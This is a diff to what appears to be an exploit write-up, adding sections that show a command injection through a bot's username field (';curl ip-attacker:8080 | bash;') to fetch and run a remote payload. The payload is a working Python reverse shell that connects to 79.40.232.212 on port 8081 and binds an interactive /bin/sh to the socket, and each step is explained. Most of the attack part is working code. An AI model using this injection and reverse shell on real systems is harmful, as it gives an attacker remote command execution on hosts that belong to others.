@@ -51,4 +51,36 @@ nc -lvnp 8081
 ```
 In the response.txt file there is the payload that the attacker wants to execute.
 
+## Exploit
+The reason I did not inject the entire payload directly through the username is due to the 32-character limit imposed on usernames (including spaces).
+Instead, I set up a remote listener to serve the full payload.
+The exploit consists of injecting a command via the username that instructs the bot to fetch and execute code from a remote response.txt file.
+The username I used to achieve this was:
+```
+;curl ip-attacker:8080 | bash;
+```
 ## Execution
+
+#### Reverse Shell
+
+To obtain a `reverse shell`, I wrote the following content in `response.txt`:
+
+```
+HTTP/1.1 200 OK
+Content-Type: text/plain
+Content-Length: 197
+
+python3 -c
+'import socket,subprocess,os;
+s=socket.socket();
+s.connect(("79.40.232.212",8081));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);'
+```
+This Python command creates a reverse shell:
+
+- It opens a socket connection to `79.40.232.212` on port `8081`.
+- It redirects the socket file descriptor to stdin (`0`), stdout (`1`), and stderr (`2`), effectively binding the shell’s input and output to the network connection.
+- It starts an interactive `/bin/sh` shell, allowing the attacker to execute commands remotely through the established connection.
